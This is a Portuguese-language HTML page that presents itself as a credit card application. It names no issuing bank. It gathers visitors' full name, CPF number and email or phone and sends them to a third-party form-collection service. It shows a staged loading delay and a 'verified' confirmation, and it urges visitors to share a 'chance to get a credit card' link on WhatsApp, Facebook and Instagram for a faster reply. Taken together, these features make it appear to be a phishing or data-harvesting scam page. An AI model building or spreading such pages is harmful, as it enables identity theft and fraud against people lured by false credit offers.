<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulário de Cadastro</title>
    <style>
        /* Estilo para o corpo da página */
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #000; /* Fundo preto */
            color: #fff; /* Texto branco */
            position: relative;
        }

        /* Estilo para o container do formulário */
        .form-container {
            background-color: #1c1c1c; /* Cor de fundo mais escura */
            padding: 30px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            width: 350px;
            text-align: center;
            position: relative;
        }

        /* Estilo para os campos de entrada */
        .form-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #2a2a2a;
            color: #fff;
            transition: border-color 0.3s;
        }

        .form-container input:focus {
            border-color: #007BFF;
            outline: none;
        }

        /* Estilo para o botão de envio */
        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .form-container button:hover {
            background-color: #0056b3;
        }

        /* Estilo para a logo */
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 100px;
            height: auto;
        }

        /* Estilo para a mensagem de confirmação */
        .message {
            margin-top: 20px;
            color: #28a745;
            display: none;
            text-align: center;
        }

        /* Estilo para a imagem de verificação */
        .verification-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin-top: 20px;
        }

        /* Estilo para a seção de informações */
        .info-section {
            background-color: #333;
            border: 1px solid #444;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: left;
            font-size: 14px;
            color: #ccc;
        }

        /* Estilo para o overlay de carregamento */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none;
        }

        .loading-spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #007BFF;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Estilo para a seção de compartilhamento */
        .share-section {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }

        .share-section a {
            margin: 0 10px;
            text-decoration: none;
        }

        .share-button {
            display: inline-block;
            width: 30px;
            height: 30px;
            background-size: cover;
            border-radius: 50%;
        }

        .whatsapp { background-image: url('https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg'); }
        .facebook { background-image: url('https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'); }
        .instagram { background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png'); }
    </style>
</head>
<body>
    <!-- Overlay de carregamento -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>

    <!-- Substitua 'logo.png' pelo caminho da sua imagem de logo -->
    <img src="imgs/logooficial.png" alt="Logo do Site" class="logo">

    <div class="form-container">
        <!-- Seção de informações com bordas arredondadas -->
        <div class="info-section">
            <p>Preencha suas informações para que possamos analisar sua solicitação de cartão de crédito. Nossa equipe retornará com uma resposta em até 3 dias.</p>
        </div>
        
        <h2>Cadastro</h2>
        <form id="contactForm" action="https://usebasin.com/f/f3b6c32abfdd" method="POST" onsubmit="handleSubmit(event)">
            <input type="text" id="name" name="name" placeholder="Nome Completo" required>
            <input type="text" id="cpf" name="cpf" placeholder="CPF" required>
            <input type="text" id="contact" name="contact" placeholder="Email ou Telefone" required>

            <!-- Botão de envio -->
            <button type="submit">Enviar</button>
        </form>
        
        <!-- Imagem de verificação e mensagem de confirmação -->
        <div class="message" id="confirmationMessage">
            <img src="imgs/verificado.png" alt="Verificado" class="verification-img">
            <p>Obrigado pelas informações. Em até 3 dias você terá uma resposta.</p>
        </div>
        
        <!-- Seção de compartilhamento -->
        <div class="share-section">
            <p>Compartilhe com seus amigos e reduza o tempo de resposta para 1 dia:</p>
            <a href="https://wa.me/?text=TENHA%20A%20CHANCE%20DE%20FAZER%20UM%20CART%C3%83O%20DE%20CR%C3%89DITO.%20CLIQUE%20NO%20LINK%20AQUI:%20SEU_URL_AQUI" target="_blank" class="share-button whatsapp"></a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=SEU_URL_AQUI&quote=TENHA%20A%20CHANCE%20DE%20FAZER%20UM%20CART%C3%83O%20DE%20CR%C3%89DITO.%20CLIQUE%20NO%20LINK%20AQUI" target="_blank" class="share-button facebook"></a>
            <a href="https://www.instagram.com/?url=SEU_URL_AQUI" target="_blank" class="share-button instagram"></a>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Impede o envio padrão do formulário
            const formData = new FormData(document.getElementById('contactForm'));
            const loadingOverlay = document.getElementById('loadingOverlay');
            const confirmationMessage = document.getElementById('confirmationMessage');

            // Mostrar overlay de carregamento
            loadingOverlay.style.display = 'flex';

            // Enviar dados para o Basin
            fetch('https://usebasin.com/f/f3b6c32abfdd', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    setTimeout(() => {
                        loadingOverlay.style.display = 'none'; // Ocultar overlay
                        confirmationMessage.style.display = 'block'; // Mostrar mensagem de confirmação
                        document.getElementById('contactForm').reset(); // Limpar o formulário
                    }, 2000); // Tempo para simular carregamento
                } else {
                    alert('Ocorreu um erro ao enviar o formulário. Tente novamente.');
                }
            })
            .catch(error => {
                alert('Ocorreu um erro ao enviar o formulário. Tente novamente.');
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
